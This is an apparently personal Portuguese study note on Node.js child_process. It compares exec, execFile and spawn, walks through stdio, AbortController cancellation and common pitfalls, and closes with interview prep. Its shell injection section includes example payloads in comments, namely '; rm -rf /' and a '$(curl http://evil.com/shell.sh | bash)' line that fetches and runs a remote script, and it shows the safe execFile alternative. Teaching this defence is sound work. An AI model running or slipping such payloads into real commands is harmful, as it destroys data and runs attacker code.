---
title: "child_process com exec e spawn"
created: 2026-05-07
updated: 2026-05-07
type: concept
status: seedling
publish: true
tags:
  - node
  - paralelismo
  - child-process
  - exec
  - spawn
  - security
aliases:
  - exec
  - spawn
  - execFile
  - shell injection
---

# child_process com exec e spawn

> [!abstract] TL;DR
> `exec` é bufferizado, conveniente e **vulnerável a shell injection** — nunca passe input externo. `execFile` dispensa o shell e é mais seguro para comandos com argumentos. `spawn` retorna streams sem limite de buffer, ideal para output longo ou processos de longa duração. Regra de ouro: sempre prefira `execFile`/`spawn` com array de argumentos; `exec` só para comandos completamente hardcoded.

---

## O que é

O módulo `node:child_process` oferece três variantes principais para executar processos externos, cada uma com trade-offs distintos de segurança, performance e ergonomia:

| Função | Shell? | Output | Uso típico |
|---|---|---|---|
| `exec` | **Sim (sempre)** | Buffer em callback | Comandos curtos e hardcoded com pipes/redirecionamentos |
| `execFile` | Não (padrão) | Buffer em callback | Comandos com argumentos externos — mais seguro que `exec` |
| `spawn` | Não (padrão) | **Streams** | Output longo, processos contínuos, backpressure |

As três funções retornam um objeto `ChildProcess` com propriedades `stdin`, `stdout` e `stderr` (quando configuradas como `'pipe'`), além de eventos como `'close'`, `'exit'` e `'error'`.

> [!note] Versão assíncrona via `util.promisify`
> `exec` e `execFile` têm assinaturas com callback. Ambas aceitam `promisify` da `node:util` e Node também exporta versões promisificadas em `child_process/promises`.

---

## Por que importa

Rodar comandos externos — `ffmpeg`, `git`, `convert`, `python`, scripts shell — é caso frequente em backends Node. A escolha errada entre `exec`, `execFile` e `spawn` é fonte clássica de dois tipos de problema:

**Problema de segurança**: `exec` interpreta a string de comando num shell (`/bin/sh` no Linux, `cmd.exe` no Windows). Input de usuário não sanitizado pode injetar comandos arbitrários — uma das vulnerabilidades mais destrutivas em servidores Node.

**Problema operacional**: `exec` e `execFile` bufferizam o output completo em memória antes de chamar o callback. O limite padrão é **1 MB** (`maxBuffer: 1024 * 1024`). Comandos que produzem mais do que isso fazem o processo filho ser encerrado com erro `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. Usar `spawn` para output grande elimina esse problema por design.

Entender quando usar cada uma — e por que a segurança é a consideração primária — é o que separa código de produção de código que vira CVE.

---

## Como funciona

### `exec` — conveniente mas com shell

`exec` spawna um shell e executa a string de comando dentro dele. Isso permite usar recursos de shell como pipes (`|`), redirecionamentos (`>`), expansão de variáveis e globbing.

```javascript
import { promisify } from 'node:util';
import { exec } from 'node:child_process';

const execP = promisify(exec);

// Apenas para comandos completamente hardcoded — sem variáveis externas
const { stdout, stderr } = await execP('git log --oneline -5');
console.log(stdout);
```

Com callback direto (API original):

```javascript
import { exec } from 'node:child_process';

exec('git log --oneline -5', { encoding: 'utf8' }, (err, stdout, stderr) => {
  if (err) {
    console.error('Erro:', err.message);
    return;
  }
  console.log(stdout);
});
```

**Opções relevantes de `exec`:**

| Opção | Padrão | Descrição |
|---|---|---|
| `encoding` | `'buffer'` | Encoding do stdout/stderr. `'utf8'` retorna string |
| `maxBuffer` | `1024 * 1024` (1 MB) | Tamanho máximo do output antes de matar o processo |
| `timeout` | `0` | Tempo máximo em ms (0 = sem limite) |
| `cwd` | `process.cwd()` | Diretório de trabalho do processo filho |
| `env` | `process.env` | Variáveis de ambiente do processo filho |
| `shell` | `/bin/sh` (Unix) | Shell a usar — sempre ativo em `exec` |
| `signal` | — | `AbortSignal` para cancelamento |

---

### `execFile` — sem shell, mais seguro

`execFile` executa o arquivo diretamente, sem interpor um shell. Os argumentos são passados como array e chegam ao processo filho literalmente — sem interpretação de metacaracteres.

```javascript
import { execFile } from 'node:child_process';

execFile('git', ['log', '--oneline', '-5'], { encoding: 'utf8' }, (err, stdout) => {
  if (err) {
    console.error('Erro:', err.message);
    return;
  }
  console.log(stdout);
});
```

Versão com promises via módulo nativo:

```javascript
import { execFile } from 'node:child_process/promises';

const { stdout } = await execFile('git', ['log', '--oneline', '-5'], {
  encoding: 'utf8',
});
console.log(stdout);
```

> [!warning] `shell: true` elimina a proteção
> Se você passar `{ shell: true }` para `execFile`, ele volta a usar um shell — e a vulnerabilidade de injeção retorna. A única proteção de `execFile` vem de `shell: false` (padrão).

**Quando preferir `execFile` sobre `exec`:**
- O comando recebe argumentos que podem vir de entrada externa
- Você não precisa de pipes ou redirecionamentos de shell
- Qualquer dúvida → use `execFile`

---

### `spawn` — streaming, sem limite de buffer

`spawn` não bufferiza output: retorna streams que você consome incrementalmente. Não há `maxBuffer` — o output flui diretamente do processo filho para o código Node.

```javascript
import { spawn } from 'node:child_process';

const proc = spawn('ffmpeg', ['-i', 'input.mp4', '-c:v', 'libvpx', 'output.webm']);

// Streaming incremental de stdout
proc.stdout.on('data', (chunk) => {
  process.stdout.write(chunk);
});

// Capturar stderr separadamente (ffmpeg loga progresso em stderr)
proc.stderr.on('data', (chunk) => {
  process.stderr.write(chunk);
});

proc.on('close', (code) => {
  console.log(`ffmpeg encerrou com código ${code}`);
});

proc.on('error', (err) => {
  console.error('Falha ao iniciar processo:', err);
});
```

Pipe direto para outro stream (sem buffering):

```javascript
import { spawn } from 'node:child_process';
import { createWriteStream } from 'node:fs';

const proc = spawn('tar', ['czf', '-', './data']);
const output = createWriteStream('backup.tar.gz');

proc.stdout.pipe(output);

proc.on('close', (code) => {
  if (code === 0) console.log('Backup concluído');
  else console.error(`tar falhou com código ${code}`);
});
```

**Opções relevantes de `spawn`:**

| Opção | Padrão | Descrição |
|---|---|---|
| `stdio` | `'pipe'` | Configuração de stdin/stdout/stderr |
| `cwd` | `process.cwd()` | Diretório de trabalho do processo filho |
| `env` | `process.env` | Variáveis de ambiente |
| `detached` | `false` | Permite o filho continuar após o pai encerrar |
| `shell` | `false` | Usar shell — evitar, pelos mesmos motivos de `exec` |
| `signal` | — | `AbortSignal` para cancelamento |

---

### Configuração de `stdio`

O parâmetro `stdio` controla como stdin, stdout e stderr do processo filho se conectam ao processo pai. Disponível nos três métodos, mas mais usada com `spawn`.

```javascript
// 'pipe' (padrão): conecta via stream acessível em proc.stdout
spawn('ls', ['-la'], { stdio: 'pipe' });

// 'inherit': o filho compartilha o terminal do pai (útil para CLIs interativas)
spawn('npm', ['install'], { stdio: 'inherit' });

// 'ignore': descarta todo output — processo filho "mudo"
spawn('background-job', [], { stdio: 'ignore' });

// Array granular: [stdin, stdout, stderr]
spawn('cmd', [], { stdio: ['pipe', 'inherit', 'pipe'] });
// stdin via stream, stdout vai direto pro terminal, stderr capturado
```

---

## Shell injection — o exemplo definitivo

Shell injection via `exec` é uma das vulnerabilidades mais destrutivas em Node. Merece atenção especial.

### O ataque

```javascript
import { exec } from 'node:child_process';

// VULNERÁVEL: input do usuário concatenado na string de comando
function buscarArquivo(userInput) {
  exec(`grep ${userInput} /var/log/app.log`, (err, stdout) => {
    console.log(stdout);
  });
}

// Chamada legítima: buscarArquivo('error')
// Executa: grep error /var/log/app.log  ✓

// Ataque: buscarArquivo('; rm -rf /')
// Executa: grep ; rm -rf /              ← o shell interpreta o ; como separador
// Resultado: deleta o sistema de arquivos

// Ataque mais sutil: buscarArquivo('$(curl http://evil.com/shell.sh | bash)')
// Executa: grep $(curl http://evil.com/shell.sh | bash) /var/log/app.log
// Resultado: baixa e executa script arbitrário
```

### A defesa

```javascript
import { execFile } from 'node:child_process';

// SEGURO: argumento passado como elemento de array, sem shell
function buscarArquivoSeguro(userInput) {
  execFile('grep', [userInput, '/var/log/app.log'], { encoding: 'utf8' }, (err, stdout) => {
    if (err) {
      console.error('grep falhou:', err.message);
      return;
    }
    console.log(stdout);
  });
}

// Ataque: buscarArquivoSeguro('; rm -rf /')
// grep recebe o string "; rm -rf /" como argumento literal — inofensivo
// Resultado: grep procura pelo padrão "; rm -rf /" no arquivo ✓
```

Com `spawn`:

```javascript
import { spawn } from 'node:child_process';

// SEGURO: spawn com array de args, shell: false (padrão)
function buscarArquivoStream(userInput) {
  const proc = spawn('grep', [userInput, '/var/log/app.log']);
  proc.stdout.pipe(process.stdout);
  proc.on('error', (err) => console.error('Erro:', err));
}
```

> [!danger] A regra sem exceção
> **Nunca** concatene input externo em strings passadas para `exec`. Isso inclui: parâmetros de query, body de request, variáveis de ambiente não-controladas, nomes de arquivo de upload, e qualquer outro dado que não seja literal hardcoded no código.

---

## Cancelamento com AbortController

Os três métodos suportam cancelamento via `AbortSignal`:

```javascript
import { execFile } from 'node:child_process';

const controller = new AbortController();
const { signal } = controller;

const proc = execFile('long-running-script', ['--arg'], { signal }, (err) => {
  if (err?.name === 'AbortError') {
    console.log('Processo cancelado via AbortController');
    return;
  }
  if (err) console.error('Erro:', err);
});

// Cancelar após 5 segundos
setTimeout(() => controller.abort(), 5000);
```

Com `spawn`:

```javascript
import { spawn } from 'node:child_process';

const controller = new AbortController();
const proc = spawn('ffmpeg', ['-i', 'input.mp4', 'output.webm'], {
  signal: controller.signal,
});

proc.on('error', (err) => {
  if (err.name === 'AbortError') {
    console.log('Transcodificação cancelada');
  }
});

// Cancelar ao receber sinal do usuário
process.on('SIGINT', () => controller.abort());
```

---

## Na prática

### Regra de ouro

```
Tem input externo?  → execFile ou spawn com array de args, NUNCA exec
Output grande?      → spawn (sem maxBuffer)
Só precisa do resultado? → execFile ou exec (promisificado)
Processo de longa duração? → spawn com eventos de stream
Pipes de shell?     → exec, apenas com args completamente hardcoded
```

### Script de build — exec legítimo

```javascript
import { promisify } from 'node:util';
import { exec } from 'node:child_process';

const execP = promisify(exec);

// ✓ Comando completamente hardcoded — sem variáveis externas
async function runBuild() {
  const { stdout } = await execP('npm run build 2>&1');
  console.log(stdout);
}
```

### Resize de imagem — execFile seguro

```javascript
import { execFile } from 'node:child_process/promises';

async function resizeImage(inputPath, outputPath, width) {
  // ✓ Todos os argumentos como array — sem shell, sem injeção
  await execFile('convert', [inputPath, '-resize', `${width}x`, outputPath]);
}

// Mesmo que inputPath seja algo como "/tmp/upload; rm -rf /" — chegará como literal
```

### Transcodificação com progresso — spawn streaming

```javascript
import { spawn } from 'node:child_process';

function transcode(input, output, onProgress) {
  const proc = spawn('ffmpeg', [
    '-i', input,
    '-progress', 'pipe:1',  // Progresso em stdout
    '-y', output,
  ]);

  let progressData = '';
  proc.stdout.on('data', (chunk) => {
    progressData += chunk.toString();
    const match = progressData.match(/out_time_ms=(\d+)/);
    if (match) onProgress(parseInt(match[1], 10));
  });

  return new Promise((resolve, reject) => {
    proc.on('close', (code) => {
      if (code === 0) resolve();
      else reject(new Error(`ffmpeg exited with code ${code}`));
    });
    proc.on('error', reject);
  });
}
```

---

## Armadilhas

### 1. Shell injection via `exec` com input externo

A armadilha mais grave. Qualquer string que passe por um shell pode ser manipulada com metacaracteres: `;`, `|`, `&&`, `||`, `$(...)`, `` `...` ``, `>`, `<`, `*`, `?`. Não existe sanitização confiável — a solução é evitar `exec` com input variável, ponto final.

```javascript
// ❌ — vulnerável independente da "sanitização"
const filename = req.body.file.replace(/[^a-z0-9]/gi, '');  // insuficiente
exec(`cat ${filename}`, callback);

// ✓ — sem shell, sem injeção possível
execFile('cat', [req.body.file], callback);
```

### 2. `maxBuffer` excedido silenciosamente

`exec` e `execFile` têm limite de 1 MB por padrão. Quando excedido, o processo filho é encerrado e o callback recebe um erro `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. O output parcial é descartado. O problema é que isso pode não aparecer em testes com dados pequenos e só explodir em produção com dados reais.

```javascript
// ❌ — quebra silenciosamente com output > 1MB
exec('journalctl -n 10000', callback);

// ✓ — opção 1: aumentar o limite (paliativo)
exec('journalctl -n 10000', { maxBuffer: 10 * 1024 * 1024 }, callback);

// ✓ — opção 2: usar spawn (sem limite)
const proc = spawn('journalctl', ['-n', '10000']);
proc.stdout.pipe(process.stdout);
```

### 3. Esquecer de ler stdout/stderr em `spawn`

Quando `stdio` é `'pipe'` (padrão), o sistema cria buffers para stdout e stderr do processo filho. Se o processo escreve mais do que o buffer do kernel suporta e o Node **não consome** esses dados, o processo filho fica bloqueado esperando — deadlock silencioso.

```javascript
// ❌ — proc.stdout não é consumido; stderr pode bloquear o filho
const proc = spawn('comando-que-produz-output');
proc.on('close', (code) => console.log(code));

// ✓ — consumir sempre, mesmo que só para descartar
proc.stdout.resume();  // Drena sem processar
proc.stderr.resume();
proc.on('close', (code) => console.log(code));
```

### 4. `spawn` com `shell: true` — mesma vulnerabilidade de `exec`

`spawn` com `shell: true` passa o comando por um shell — tornando-o igualmente vulnerável a injeção. A documentação oficial (v23.11+) deprecou a combinação de `args` com `shell: true`.

```javascript
// ❌ — shell: true elimina a proteção do array de args
spawn('grep', [userInput, 'file.txt'], { shell: true });

// ✓ — shell: false (padrão) — seguro
spawn('grep', [userInput, 'file.txt']);
```

### 5. Processo filho vira zumbi se o pai crasha

Se o processo pai encerra abruptamente sem encerrar os filhos, os filhos continuam rodando como processos órfãos. Em cenários de crash/restart frequente, isso acumula processos zumbi consumindo recursos.

```javascript
// ✓ — usar AbortController para encerrar filhos ao sair
const controller = new AbortController();
const proc = spawn('long-process', [], { signal: controller.signal });

process.on('exit', () => controller.abort());
process.on('SIGTERM', () => {
  controller.abort();
  process.exit(0);
});
```

### 6. Confundir código de saída com erro de spawn

`proc.on('error')` dispara quando **não foi possível iniciar o processo** (comando não encontrado, permissão negada). `proc.on('close', code)` dispara quando o processo iniciou e **encerrou com código diferente de 0**. São eventos distintos.

```javascript
proc.on('error', (err) => {
  // err.code === 'ENOENT' → comando não encontrado
  // err.code === 'EACCES' → sem permissão
  console.error('Falha ao iniciar:', err.message);
});

proc.on('close', (code, signal) => {
  if (code !== 0) {
    // O processo iniciou mas retornou erro
    console.error(`Processo encerrou com código ${code}`);
  }
  if (signal) {
    // Processo foi encerrado por sinal (ex.: SIGKILL)
    console.error(`Encerrado por sinal: ${signal}`);
  }
});
```

---

## Em entrevista

### Frase pronta (em inglês)

> "Node's `child_process` module gives you three main APIs for running external processes, each with different trade-offs. `exec` spawns a shell and buffers the full output — convenient for quick hardcoded shell commands with pipes, but dangerously vulnerable to shell injection if you ever interpolate external input into the command string. `execFile` skips the shell by default, passing arguments as an array directly to the executable — that makes it the safe choice when arguments come from user input. `spawn` returns streams instead of buffering, so it handles large or continuous output without hitting a buffer limit. The rule I follow is: use `execFile` or `spawn` with an argument array for anything that touches external data; reserve `exec` for fully hardcoded commands where no variable input exists. Shell injection through `exec` is a classic CVE pattern — an attacker passes something like `; rm -rf /` and the shell happily executes it."

### Vocabulário técnico

| PT-BR | EN |
|---|---|
| executar comando externo | execute external command / shell out |
| injeção de shell | shell injection |
| spawnar processo | spawn a process |
| processo filho | child process |
| saída em fluxo / streaming | streaming output |
| bufferizar output | buffer output |
| buffer limite excedido | max buffer exceeded |
| argumento literal | literal argument |
| metacaractere de shell | shell metacharacter |
| sinal de encerramento | termination signal |
| processo órfão / zumbi | orphan process / zombie process |
| canal de I/O padrão | standard I/O / stdio |

### Perguntas frequentes em entrevista

**"Qual a diferença entre `exec` e `execFile`?"**
`exec` usa um shell — permite pipes e redirecionamentos, mas interpreta metacaracteres na string de comando. `execFile` não usa shell por padrão — os argumentos chegam ao processo literalmente, sem interpretação. Isso torna `execFile` seguro para argumentos de origem externa. O output de ambos é bufferizado com limite de 1 MB por padrão.

**"Quando você usaria `spawn` em vez de `exec`?"**
Quando o output pode ser maior que 1 MB, quando você precisa processar dados incrementalmente (streaming), ou quando o processo roda por tempo indeterminado — como um servidor ou processo de monitoramento. `spawn` não tem limite de buffer porque não acumula — você consome os dados à medida que chegam.

**"Como você previne shell injection em Node?"**
Usando `execFile` ou `spawn` com argumentos como array — nunca concatenando input externo em strings passadas para `exec`. Quando você passa `['grep', [userInput, 'file.txt']]`, o Node passa `userInput` como argumento literal ao `grep`, sem nenhuma interpretação de shell. O metacaractere `;`, `|` ou `$()` no input se torna texto inerte.

**"O que acontece quando o output de `exec` excede o `maxBuffer`?"**
O processo filho é encerrado pelo Node e o callback recebe um erro `ERR_CHILD_PROCESS_STDIO_MAXBUFFER`. O output parcial é descartado. O valor padrão é 1 MB. Para output grande, a solução correta é `spawn` com streaming.

---

## Veja também

- [[02 - As 3 ferramentas - Worker Threads, Cluster, child_process]] — visão geral dos três modelos de paralelismo Node
- [[09 - child_process com fork - Node child com IPC]] — processo Node filho com canal IPC bidirecional
- [[12 - Armadilhas, regras práticas, cheatsheet]] — cheatsheet consolidado da trilha
- [[Node.js]] — tronco da trilha Node Senior
